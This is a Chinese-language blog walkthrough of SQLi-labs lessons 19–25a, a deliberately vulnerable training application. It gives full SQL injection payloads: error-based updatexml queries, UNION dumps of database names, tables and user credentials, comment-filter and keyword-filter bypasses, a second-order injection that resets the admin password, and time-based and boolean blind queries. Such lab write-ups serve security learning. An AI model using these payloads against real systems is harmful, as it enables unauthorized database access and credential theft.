<h2 id="Less-19：POST-Header-Injection-Referer-field-Error-based-A"><a href="#Less-19：POST-Header-Injection-Referer-field-Error-based-A" class="headerlink" title="Less-19：POST-Header Injection -Referer field -Error based A"></a>Less-19：POST-Header Injection -Referer field -Error based A</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容： ‘and updatexml(1,concat(0x7e,(database()),0x7e),1) and ’1‘&#x3D; ‘1注册登录再注入</span><br><span class="line">1. 登录成功显示的是Referer信息</span><br><span class="line">2. 登录失败是没有回显信息的</span><br><span class="line">3. $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;referers&#96; (&#96;referer&#96;, &#96;ip_address&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</span><br><span class="line">4. 分析后得知，需要进行闭合操作，两种方法：</span><br><span class="line">（1）&#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;&#x3D;‘1</span><br><span class="line">（2）‘ or updatexml(1,concat(0x7e,(database())),1), ‘’)#  (注意在直接复制的时候，可能出现错误，因为ppt格式的问题)</span><br><span class="line">然后再通过mysql注入语句进行操作即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less20：POST-Cookie-injections-Uagent-field-error-based"><a href="#Less20：POST-Cookie-injections-Uagent-field-error-based" class="headerlink" title="Less20：POST - Cookie injections - Uagent field - error based."></a>Less20：POST - Cookie injections - Uagent field - error based.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容</span><br><span class="line">注册登录再注入</span><br><span class="line">1.登录成功之后会显示cookie</span><br><span class="line">2. 登录失败会显示失败信息。</span><br><span class="line">3. $sql&#x3D;“SELECT * FROM users WHERE username&#x3D;‘$cookee’ LIMIT 0,1”; 在登录之后后台会将username放入cookie中，再次登录的时候，只要是cookie没有过期，就会去cookie里面取值，然后进行查询。</span><br><span class="line">4.  使用chrome工具： Cookie Editor</span><br><span class="line">5.  ‘ union select 1,2,database()#</span><br><span class="line">6. 接下来就是常见的注入教程。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-21：POST-Dump-into-outfile-String"><a href="#Less-21：POST-Dump-into-outfile-String" class="headerlink" title="Less-21：POST- Dump into outfile - String"></a>Less-21：POST- Dump into outfile - String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容</span><br><span class="line">注册登录再注入</span><br><span class="line">1.登录成功之后会显示一系列信息</span><br><span class="line">2. 登录失败会显示失败信息。</span><br><span class="line">3.  和第20关相似，只不过这一次将admin进行base64转码    YWRtaW4&#x3D;  解码之后为admin</span><br><span class="line">4.  使用chrome工具： Cookie Editor</span><br><span class="line">5. &#39;) union select 1,2,database()#</span><br><span class="line">6. 接下来就是常见的注入教程。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-22：Future-Editions"><a href="#Less-22：Future-Editions" class="headerlink" title="Less-22：Future Editions"></a>Less-22：Future Editions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容</span><br><span class="line">注册登录再注入</span><br><span class="line">1.登录成功之后会显示一系列信息</span><br><span class="line">2. 登录失败会显示失败信息。</span><br><span class="line">3.  和第21关相似，只不过这一次将’) 换为” 即可！</span><br><span class="line">4.  使用chrome工具： Cookie Editor</span><br><span class="line">5. “ union select 1,2,database()#</span><br><span class="line">6. 接下来就是常见的注入教程。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-23-GET-Error-based-strip-comments"><a href="#Less-23-GET-Error-based-strip-comments" class="headerlink" title="Less-23: GET Error based strip comments"></a>Less-23: GET Error based strip comments</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">首先在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1 显示的有信息</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1’ 此时显示报错</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1’--+ 此时无法进行闭合</span><br><span class="line">4. 我们回到less-01 在第一关中，我们看到可以正常使用闭合。此时我们查阅源码：</span><br><span class="line"></span><br><span class="line">$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;</span><br><span class="line">$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;</span><br><span class="line">$replace &#x3D; &quot;&quot;;     </span><br><span class="line"></span><br><span class="line">$id &#x3D; preg_replace($reg, $replace, $id);</span><br><span class="line">$id &#x3D; preg_replace($reg1, $replace, $id);   源码中对于 --+      # 进行了过滤处理， 所以这里我们只能使用and 或者or语句进行闭合,--和#全都替换成空了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在这里可以使用另外一种特殊的注释符   ;%00 通过这个注释符可以判断列数</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>法一</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在这里可以使用另外一种特殊的注释符   ;%00 通过这个注释符可以判断列数</span><br><span class="line">除了在url末尾将--+、# 替换为 ;%00   其余的均和less01关相同。</span><br><span class="line"></span><br><span class="line">1. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1 返回正常</span><br><span class="line">2. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1’ 返回异常，说明可能存在漏洞</span><br><span class="line">3. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1’ --+  或者http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1’ # 均返回错误，通过源代码分析，我们得知--+    #  都被替换为了空格，这里使用      ;%00充当注释符</span><br><span class="line">4. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1‘  order by 3  ;%00 查多少列</span><br><span class="line">5. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1’  union select 1,2,3    ;%00   查找回显位置</span><br><span class="line">6. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(schema_name) from    information_schema.schemata    ;%00 查库名</span><br><span class="line">7. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(table_name) from  information_schema.tables where table_schema &#x3D; 0x7365637572697479    ;%00  查表名</span><br><span class="line">8. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273   ;%00 查字段名</span><br><span class="line">9. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users   ;%00 查出字段中所有的值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="sql-语句解析顺序"><a href="#sql-语句解析顺序" class="headerlink" title="sql 语句解析顺序"></a>sql 语句解析顺序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">参考链接： https:&#x2F;&#x2F;www.cnblogs.com&#x2F;annsshadow&#x2F;p&#x2F;5037667.html</span><br><span class="line"></span><br><span class="line">以less-23为例，我们使用正常的order by来查询一下一共有多少列：</span><br><span class="line"></span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 因为没有闭合，所以肯定会报错</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 and  ’1‘&#x3D;‘1 返回是正常的，但是由于我们已知肯定没有10列，这是为什么还会返回正常？</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 or ’1‘&#x3D;‘1 此时使用or，返回依旧正常。</span><br><span class="line"></span><br><span class="line">我们回到mysql命令行，执行以下语句：</span><br><span class="line"></span><br><span class="line">1. select * from users where id &#x3D;1 ; 此时返回数据肯定是正常的。</span><br><span class="line">2. select * from users where id &#x3D;1  and 1&#x3D;1; 此时返回数据也是正常的。</span><br><span class="line">3. select * from users where id &#x3D;1  or  1&#x3D;1;   此时返回了所有的数据。</span><br><span class="line">4. select * from users where id &#x3D;11111  or  1&#x3D;1; 此时也是返回了所有的数据。 说明执行的时候是  A or B </span><br><span class="line">5. select * from users where id &#x3D;1 order by 3; 返回正常，肯定正常。</span><br><span class="line">6. select * from users where id &#x3D;1  order by 3 and 1&#x3D;1; 此时依旧返回正常。</span><br><span class="line">7. select * from users where id &#x3D;1  order by 4444 and 1&#x3D;1;   此时返回正常</span><br><span class="line"></span><br><span class="line">8.  select * from users where id &#x3D;1  order by 4444 or  1&#x3D;1;   依旧返回正常</span><br><span class="line">9.  select * from users where id &#x3D;1  and 1&#x3D;1 order by 3;  此时返回正常</span><br><span class="line">10. select * from users where id &#x3D;1  and 1&#x3D;1 order by 3333;  返回不存在这个列，也可以理解为正常。</span><br><span class="line">11. select * from users where id &#x3D;1111  and 1&#x3D;1 order by 3;   返回为空，但是语句执行正常。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/../../../../../%25E6%25B4%25BB%25E5%2588%25B0%25E8%2580%2581%25E5%25AD%25A6%25E5%2588%25B0%25E8%2580%2581/--%25E7%25BD%2591%25E7%25BB%259C%25E4%25B8%258E%25E5%25AE%2589%25E5%2585%25A8---/%25E5%25AD%25A6%25E4%25B9%25A0/%25E6%2596%2587%25E6%25A1%25A3/%25E5%25B7%25A5%25E5%2585%25B7%25E5%2591%25BD%25E4%25BB%25A4/mysql/image-20200523130248091.png" alt="image-20200523130248091"></p>
<p>你可以理解为<code>order by</code> 在执行的时候被忽略了，这是由于mysql解析顺序决定的。具体参考： ： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/annsshadow/p/5037667.html">https://www.cnblogs.com/annsshadow/p/5037667.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">我们在url中构造：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 or ’1‘&#x3D;‘1 已知这种构造是错误的，但是如何使用order by 语句进行报错呢？</span><br><span class="line"></span><br><span class="line">1. select * from users where id &#x3D;1 and 1&#x3D;1 order by 10; 在sql语句中，我们可以使用这种语法，原因是因为</span><br><span class="line">id&#x3D;1 and 1&#x3D;1 作为where的条件，被执行之后得到结果，然后执行order by，因为结果中没有第10个字段所有报错了。在第二个查询语句中，order by在where的条件中，在where执行时被忽略了，得到结果之后并未再执行order by。</span><br><span class="line"></span><br><span class="line">但是针对本题中：</span><br><span class="line">2.  http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ or ’1‘&#x3D;’1 order by 10  对应的sql语句：  SELECT * FROM users WHERE id&#x3D;‘1’ or ‘1’&#x3D;‘1 order by 10’ LIMIT 0,1    我们知道永远都不可能有报错的情况，所以对此，less23中建议使用union select进行</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1111‘  union select 1,2,3,4 and ’1‘&#x3D;‘1  使用这样的，或者使用or，这是因为这里的and 或 or作为了联合查询第二个语句的条件而不是第一个语句where的条件。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着做</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ and  ’1‘&#x3D;‘1 使用and 或者是or都可以</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ union select 1,2,3’ 我们使用union select进行闭合，其中要在3的位置进行闭合操作，但是在页面上没有显示1,2,3</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,3’ 此时我们将前面的值进行报错，使得前面的值无法被查询到</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,3’ 此时我们看到2,3位置有回显信息，我们可以选择使用2,3位置继续进行注入</span><br><span class="line">使用-1或者是任意一个超出数据库中的数据均可：</span><br><span class="line"> select * from users where id&#x3D;1 union select 1,2,3; 这个语句可以查询到 1,2,3</span><br><span class="line"> select * from users where id&#x3D;-1 union select 1,2,3; 这个语句只能查询到1,2,3，我们也可以在id&#x3D;1的位置上使用一个较大的数字都是可以的</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;111‘ union select 1,2,database()’ 查询当前的数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) ‘ 可查询所有的库信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)’  查询所有的表信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)’ 查询所有的列信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;-1‘ union select 1,2,(select  group_concat(concat_ws(0x7e,username,password)) from security.users)’ 一次性查询所有的字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>方法二</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">此时我们考虑使用第二种方法：报错注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ and updatexml(1,concat(0x7e,(database())),1) or ’1‘&#x3D;‘1 报错出数据库</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1) or ’1‘&#x3D;‘1 查询所有的数据库，使用limit进行逐个查询。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>思考</strong></p>
<p>思考：在less-01中我们使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Less-01：  union select 1,2, group_concat(schema_name) from information_schema.schemata --+ 可以执行</span><br><span class="line">在less-23中</span><br><span class="line">Less-23： union select 1,2, group_concat(schema_name) from information_schema.schemata ‘ 执行失败</span><br><span class="line">修正：union select 1,2,(select group_concat(schema_name) from information_schema.schemata)’ 执行成功</span><br><span class="line">闭合问题：执行shell可以发现：</span><br><span class="line"></span><br><span class="line">此时如何我们不想使用括号的时候如何处理？</span><br><span class="line">union select 1,2,group_concat(schema_name) from information_schema.schemata where ‘a’&#x3D;‘a  这样就可以了，原因就是闭合的问题</span><br><span class="line">在shell中执行可以看下：</span><br><span class="line"> select * from users where ‘a’&#x3D;‘a’;  这样可以查询到所有的数据</span><br><span class="line"> select * from users ;其实就是 select * from users where true;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200523165517708.png" alt="image-20200523165517708"></p>
<h2 id="Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections"><a href="#Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections" class="headerlink" title="Less-24: POST- Second Oder Injections Real treat - Stored Injections"></a>Less-24: POST- Second Oder Injections <em>Real treat</em> - Stored Injections</h2><p>在windows下解压的时候可能会遇到文件名相同的问题，导致我们less24关的代码不完整。从而出现重命名。<br>我们将文件在notepad++中打开，搜索logined-in.php将文件名称进行替换即可！ 注意不可将Logined-in.php进行替换</p>
<p><img src="/2020/07/13/sqlo-labs/image-20200523170108016.png" alt="image-20200523170108016"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 本关中由于对数据库长度做了限制，所以本次只演示替换密码：</span><br><span class="line">2. 首先我们查询目前的users表信息，找到admin的密码</span><br><span class="line">3. 我们用admin’# 注册一个账号，再登录</span><br><span class="line">4.我们修改admin的密码</span><br><span class="line">SQL语句：</span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;123456&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;123456&#39; where username&#x3D;&#39;admin’</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-25-GET-Error-based-All-your-OR-amp-AND-belong-to-us-string-single-quote"><a href="#Less-25-GET-Error-based-All-your-OR-amp-AND-belong-to-us-string-single-quote" class="headerlink" title="Less-25: GET- Error based - All your OR &amp; AND belong to us -string single quote"></a>Less-25: GET- Error based - All your OR &amp; AND belong to us -string single quote</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1’ 此时报错，说明存在漏洞</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1‘  order by  1--+ 使用order by 语句发现报错，无法使用</span><br><span class="line">4. Hint: Your Input is Filtered with following result: 1‘ der by 1– 网页里，作者给出了一个提示，发现or被过滤了，我们尝试双写</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;1‘  oorrder by  1--+ 返回正常，可以进行测试，最后知道有3列</span><br><span class="line">6. 双写的情况下，我们开始测试</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,3--+ 获得回显位置</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,schema_name from information_schema.schemata --+ 根据提示我们可以到所有的or都被替换了，所以所有位置的or都需要写两次</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata --+ 取出所有的库</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;0x7365637572697479 --+ 取出所有的表</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;0x7573657273--+ 取出所有的字段</span><br><span class="line">6. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+ 取出字段中的值</span><br><span class="line">当我们使用or -&gt; ||的时候：</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  || 1&#x3D;1--+ 判断存在注入</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  || updatexml(1,concat(0x7e,(database()),0x7e),1)--+ 爆出当前数据库</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25&#x2F;?id&#x3D;-1‘  || updatexml(1,concat(0x7e,(select schema_name from infoorrmation_schema.schemata limit 0,1),0x7e),1)--+ 遍历爆出所有的数据，继续使用即可，这里不可以使用group_concat()，因为数据显示不完整</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-25a-GET-Blind-Based-All-your-OR-amp-AND-belong-to-us-Intiger-based"><a href="#Less-25a-GET-Blind-Based-All-your-OR-amp-AND-belong-to-us-Intiger-based" class="headerlink" title="Less-25a : GET - Blind Based - All your OR &amp; AND belong to us-Intiger based"></a>Less-25a : GET - Blind Based - All your OR &amp; AND belong to us-Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;1 页面显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;1’ 此时页面发生显著变化，数据消失，说明存在注入，但是通过$sql语句得知，此处并没有将id值进行包裹</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3--+ 可以使用联合查询，当我们使用联合查询注入时：</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata--+ 查到库</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;0x7573657273--+ 查到字段</span><br><span class="line">6. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+ 查到字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当我们使用基于时间的布尔盲注：</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr if(length(database())&gt;1,1,sleep(5))--+ 可以通过这个判断当前数据库长度</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorrif(left(database(),1)&gt;‘a’,1,sleep(5))--+ 判断当前数据库的组成</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr if(left((select schema_name from infoorrmation_schema.schemata limit 0,1),1)&gt;‘a’,1,sleep(5))--+ 通过这个判断所有的数据库</span><br><span class="line">依次再进行下去。。。</span><br><span class="line">当我们使用布尔盲注的时候：</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr length(database())&gt;1--+ 此时页面返回正常，则得知当前的数据库长度是大于1的</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr left((select schema_name from infoorrmation_schema.schemata limit 0,1),1)&gt;‘a’--+当前的页面返回正常，说明此时的第一个数据库的第一个字母是大于a的</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-25a&#x2F;?id&#x3D;-1 oorr left((select schema_name from infoorrmation_schema.schemata limit 0,1),1)&#x3D;‘a’--+ 此时等于a的时候，页面返回异常，说明我们的语句写的是正确的。</span><br><span class="line">依次再进行下去。。。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

